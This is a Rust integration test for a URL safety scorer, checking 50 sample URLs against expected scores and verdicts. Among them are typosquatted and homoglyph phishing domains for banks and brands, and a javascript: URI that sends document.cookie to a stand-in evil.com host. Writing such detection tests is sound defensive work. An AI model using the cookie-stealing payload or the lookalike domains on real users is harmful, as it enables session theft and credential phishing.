use garuda_core::{flag_a, scorer};
use garuda_core::types::Verdict;

fn setup_brand_rules() {
    std::env::set_var("GARUDA_BRANDS_PATH", "../../lists/brands.txt");
}

struct TestCase {
    url: &'static str,
    expected_min_score: u8,
    expected_max_score: u8,
    expected_verdict: Option<Verdict>,
    description: &'static str,
}

#[test]
fn test_50_safety_scenarios() {
    setup_brand_rules();

    let cases = vec![
        // ==========================================
        // 1. CLEAN / SAFE DOMAINS (10 Cases)
        // ==========================================
        TestCase {
            url: "https://google.com",
            expected_min_score: 0,
            expected_max_score: 24,
            expected_verdict: Some(Verdict::Clean),
            description: "Legitimate Google domain",
        },
        TestCase {
            url: "https://youtube.com/watch?v=123",
            expected_min_score: 0,
            expected_max_score: 24,
            expected_verdict: Some(Verdict::Clean),
            description: "Legitimate YouTube video link",
        },
        TestCase {
            url: "https://amazon.com/dp/B07PPDN1S1",
            expected_min_score: 0,
            expected_max_score: 24,
            expected_verdict: Some(Verdict::Clean),
            description: "Legitimate Amazon product link",
        },
        TestCase {
            url: "https://microsoft.com/en-us/windows",
            expected_min_score: 0,
            expected_max_score: 24,
            expected_verdict: Some(Verdict::Clean),
            description: "Legitimate Microsoft page",
        },
        TestCase {
            url: "https://github.com/rust-lang/rust",
            expected_min_score: 0,
            expected_max_score: 24,
            expected_verdict: Some(Verdict::Clean),
            description: "Legitimate Github repository link",
        },
        TestCase {
            url: "https://wikipedia.org/wiki/Rust_(programming_language)",
            expected_min_score: 0,
            expected_max_score: 24,
            expected_verdict: Some(Verdict::Clean),
            description: "Legitimate Wikipedia article",
        },
        TestCase {
            url: "https://uidai.gov.in/en/my-aadhaar/about-your-aadhaar.html",
            expected_min_score: 0,
            expected_max_score: 24,
            expected_verdict: Some(Verdict::Clean),
            description: "Legitimate Aadhaar / Indian government website",
        },
        TestCase {
            url: "https://sbi.co.in",
            expected_min_score: 0,
            expected_max_score: 24,
            expected_verdict: Some(Verdict::Clean),
            description: "Legitimate State Bank of India homepage",
        },
        TestCase {
            url: "https://outlook.com/owa",
            expected_min_score: 0,
            expected_max_score: 24,
            expected_verdict: Some(Verdict::Clean),
            description: "Legitimate Outlook Web App access",
        },
        TestCase {
            url: "https://incometax.gov.in/iec/foportal/",
            expected_min_score: 0,
            expected_max_score: 24,
            expected_verdict: Some(Verdict::Clean),
            description: "Legitimate Income Tax portal",
        },

        // ==========================================
        // 2. BRAND IMPERSONATION IN HOSTNAME (10 Cases)
        // ==========================================
        TestCase {
            url: "https://google-login.vercel.app",
            expected_min_score: 50,
            expected_max_score: 100,
            expected_verdict: None,
            description: "Google brand containment on Vercel app platform",
        },
        TestCase {
            url: "https://sbi-netbanking.firebaseapp.com",
            expected_min_score: 50,
            expected_max_score: 100,
            expected_verdict: None,
            description: "SBI bank brand containment on Firebase hosting",
        },
        TestCase {
            url: "https://paytm-kyc-verify.netlify.app",
            expected_min_score: 50,
            expected_max_score: 100,
            expected_verdict: None,
            description: "Paytm brand containment on Netlify",
        },
        TestCase {
            url: "https://rnicrosoft.com",
            expected_min_score: 50,
            expected_max_score: 100,
            expected_verdict: None,
            description: "Microsoft homoglyph typo (rn -> m)",
        },
        TestCase {
            url: "https://paypaI.com",
            expected_min_score: 50,
            expected_max_score: 100,
            expected_verdict: None,
            description: "PayPal homoglyph typo (l -> capital I)",
        },
        TestCase {
            url: "https://goog1e.com",
            expected_min_score: 50,
            expected_max_score: 100,
            expected_verdict: None,
            description: "Google homoglyph typo (l -> 1)",
        },
        TestCase {
            url: "https://arnazon.in",
            expected_min_score: 50,
            expected_max_score: 100,
            expected_verdict: None,
            description: "Amazon typo (m -> rn) in India ccTLD",
        },
        TestCase {
            url: "https://linkedln.com",
            expected_min_score: 50,
            expected_max_score: 100,
            expected_verdict: None,
            description: "LinkedIn typo (i -> l)",
        },
        TestCase {
            url: "https://netflix-payment.web.app",
            expected_min_score: 50,
            expected_max_score: 100,
            expected_verdict: None,
            description: "Netflix impersonation on Google web app",
        },
        TestCase {
            url: "https://jio-recharge-plans.pages.dev",
            expected_min_score: 50,
            expected_max_score: 100,
            expected_verdict: None,
            description: "Jio impersonation on Cloudflare Pages",
        },

        // ==========================================
        // 3. BRAND IMPERSONATION IN PATH / QUERY (10 Cases)
        // ==========================================
        TestCase {
            url: "https://evil-site.com/paypal/signin",
            expected_min_score: 30,
            expected_max_score: 100,
            expected_verdict: None,
            description: "PayPal brand detected in URL path",
        },
        TestCase {
            url: "https://hacker.com/verify/axisbank",
            expected_min_score: 30,
            expected_max_score: 100,
            expected_verdict: None,
            description: "Axisbank brand detected in URL path",
        },
        TestCase {
            url: "https://malicious.org/sbi/netbanking/login",
            expected_min_score: 30,
            expected_max_score: 100,
            expected_verdict: None,
            description: "SBI brand detected in path with netbanking keywords",
        },
        TestCase {
            url: "https://phishing-portal.com/google/account/recovery",
            expected_min_score: 30,
            expected_max_score: 100,
            expected_verdict: None,
            description: "Google brand in path with account recovery keywords",
        },
        TestCase {
            url: "https://suspicious-link.net/coinbase/wallet",
            expected_min_score: 30,
            expected_max_score: 100,
            expected_verdict: None,
            description: "Coinbase crypto brand in path",
        },
        TestCase {
            url: "https://legit-looking.xyz/metamask-wallet/seed-phrase",
            expected_min_score: 30,
            expected_max_score: 100,
            expected_verdict: None,
            description: "Metamask brand in path with seed-phrase keyword",
        },
        TestCase {
            url: "https://site-hosting-online.com/whatsapp-verify/chats",
            expected_min_score: 30,
            expected_max_score: 100,
            expected_verdict: None,
            description: "Whatsapp brand and verify keyword in path",
        },
        TestCase {
            url: "https://hacker-domain.xyz/instagram-login/profile",
            expected_min_score: 30,
            expected_max_score: 100,
            expected_verdict: None,
            description: "Instagram brand and login keyword in path",
        },
        TestCase {
            url: "https://portal-billing.net/amazon-primevideo/billing-update",
            expected_min_score: 30,
            expected_max_score: 100,
            expected_verdict: None,
            description: "Amazon and primevideo brand in path",
        },
        TestCase {
            url: "https://update-security.com/microsoftonline/verify-credentials",
            expected_min_score: 30,
            expected_max_score: 100,
            expected_verdict: None,
            description: "Microsoftonline brand in path with verify keyword",
        },

        // ==========================================
        // 4. DANGEROUS SCHEMES (5 Cases)
        // ==========================================
        TestCase {
            url: "javascript:void(fetch('http://evil.com/steal?cookies='+document.cookie))",
            expected_min_score: 100,
            expected_max_score: 100,
            expected_verdict: Some(Verdict::Block),
            description: "XSS-prone JavaScript URI",
        },
        TestCase {
            url: "data:text/html;base64,PGh0bWw+UGhpc2hpbmc8L2h0bWw+",
            expected_min_score: 100,
            expected_max_score: 100,
            expected_verdict: Some(Verdict::Block),
            description: "Phishing payload inside Data URI",
        },
        TestCase {
            url: "blob:https://malicious-blob-source.xyz/1a2b3c4d",
            expected_min_score: 100,
            expected_max_score: 100,
            expected_verdict: Some(Verdict::Block),
            description: "Blob URI used for dynamic payload execution",
        },
        TestCase {
            url: "vbscript:msgbox(\"System Compromised\")",
            expected_min_score: 100,
            expected_max_score: 100,
            expected_verdict: Some(Verdict::Block),
            description: "Active VBScript scheme execution",
        },
        TestCase {
            url: "ftp://anonymous:anonymous@phishing-ftp.net/malware.exe",
            expected_min_score: 100,
            expected_max_score: 100,
            expected_verdict: Some(Verdict::Block),
            description: "FTP scheme for active malware hosting",
        },

        // ==========================================
        // 5. PERCENT-ENCODED BRAND & KEYWORD BYPASSES (5 Cases)
        // ==========================================
        TestCase {
            url: "https://pay%70al-verify.com",
            expected_min_score: 45,
            expected_max_score: 100,
            expected_verdict: None,
            description: "Percent-encoded brand name in host (pay%70al -> paypal)",
        },
        TestCase {
            url: "https://%6dicrosoftonline-auth.com",
            expected_min_score: 50,
            expected_max_score: 100,
            expected_verdict: None,
            description: "Percent-encoded brand name in host (%6d -> m)",
        },
        TestCase {
            url: "https://evil.com/pay%70al/%6cogin",
            expected_min_score: 30,
            expected_max_score: 100,
            expected_verdict: None,
            description: "Percent-encoded brand (pay%70al) and keyword (%6cogin -> login) in path",
        },
        TestCase {
            url: "https://hacker.com/google-%61ccount/%76erify",
            expected_min_score: 30,
            expected_max_score: 100,
            expected_verdict: None,
            description: "Percent-encoded keywords (%61ccount -> account, %76erify -> verify) in path",
        },
        TestCase {
            url: "https://sbi-net%62anking.xyz",
            expected_min_score: 25,
            expected_max_score: 100,
            expected_verdict: None,
            description: "Percent-encoded keyword in hostname (%62anking -> banking)",
        },

        // ==========================================
        // 6. FREE PLATFORMS AND KEYWORDS (5 Cases)
        // ==========================================
        TestCase {
            url: "https://wallet-recovery-seed.netlify.app",
            expected_min_score: 60,
            expected_max_score: 100,
            expected_verdict: None,
            description: "Crypto wallet keywords on free Netlify hosting",
        },
        TestCase {
            url: "https://axisbank-secure-netbanking.web.app/login",
            expected_min_score: 80,
            expected_max_score: 100,
            expected_verdict: Some(Verdict::Block),
            description: "Bank brand impersonation & login on Firebase Hosting",
        },
        TestCase {
            url: "https://income-tax-refund.netlify.app/verify",
            expected_min_score: 50,
            expected_max_score: 100,
            expected_verdict: None,
            description: "Tax refund phishing on Netlify hosting",
        },
        TestCase {
            url: "https://hdfc-bank-auth-kyc.glitch.me",
            expected_min_score: 80,
            expected_max_score: 100,
            expected_verdict: Some(Verdict::Block),
            description: "HDFC bank phishing on Glitch.me free platform",
        },
        TestCase {
            url: "https://metamask-security-auth.replit.dev",
            expected_min_score: 80,
            expected_max_score: 100,
            expected_verdict: Some(Verdict::Block),
            description: "Metamask brand and security keywords on Replit",
        },

        // ==========================================
        // 7. HOMOGLYPHS AND MISC SUSPICIOUS (5 Cases)
        // ==========================================
        TestCase {
            url: "https://rn-paypal-secure.com",
            expected_min_score: 50,
            expected_max_score: 100,
            expected_verdict: None,
            description: "Exact homoglyph sequence (rn -> m) with brand in host",
        },
        TestCase {
            url: "https://paypa1-verify.in",
            expected_min_score: 50,
            expected_max_score: 100,
            expected_verdict: None,
            description: "Typo with number '1' for letter 'l'",
        },
        TestCase {
            url: "https://192.168.1.1/login.html",
            expected_min_score: 25,
            expected_max_score: 100,
            expected_verdict: None,
            description: "IP address used as a hostname",
        },
        TestCase {
            url: "https://auth-account-verification-portal.com",
            expected_min_score: 25,
            expected_max_score: 100,
            expected_verdict: None,
            description: "Domain constructed solely of highly suspicious keywords",
        },
        TestCase {
            url: "https://google.com-recovery-verification-signin.info",
            expected_min_score: 60,
            expected_max_score: 100,
            expected_verdict: None,
            description: "Brand name containment combined with highly suspicious TLD suffix",
        },
    ];

    assert_eq!(cases.len(), 50, "Integration test must contain exactly 50 test cases");

    let mut failed = 0;
    println!("\n=== RUNNING 50 SAFETY ENGINE TEST SCENARIOS ===");

    for (index, case) in cases.iter().enumerate() {
        let (score, reasons) = flag_a::analyse(case.url);
        let verdict = scorer::score_to_verdict(score, reasons.clone());

        let score_ok = score >= case.expected_min_score && score <= case.expected_max_score;
        let verdict_ok = case.expected_verdict.as_ref().map_or(true, |expected| {
            format!("{:?}", expected) == format!("{:?}", verdict.verdict)
        });

        if score_ok && verdict_ok {
            println!(
                "[{:02}/50] PASS: \"{}\" | Score: {} | Verdict: {:?}",
                index + 1,
                case.url,
                score,
                verdict.verdict
            );
        } else {
            failed += 1;
            println!(
                "[{:02}/50] FAIL: \"{}\"\n  - Description: {}\n  - Got Score: {}, expected: [{}..{}]\n  - Got Verdict: {:?}, expected: {:?}\n  - Reasons: {:?}",
                index + 1,
                case.url,
                case.description,
                score,
                case.expected_min_score,
                case.expected_max_score,
                verdict.verdict,
                case.expected_verdict,
                reasons
            );
        }
    }

    assert_eq!(failed, 0, "{} out of 50 safety test scenarios failed!", failed);
    println!("=== SUCCESS: ALL 50 SAFETY TEST SCENARIOS PASSED! ===\n");
}
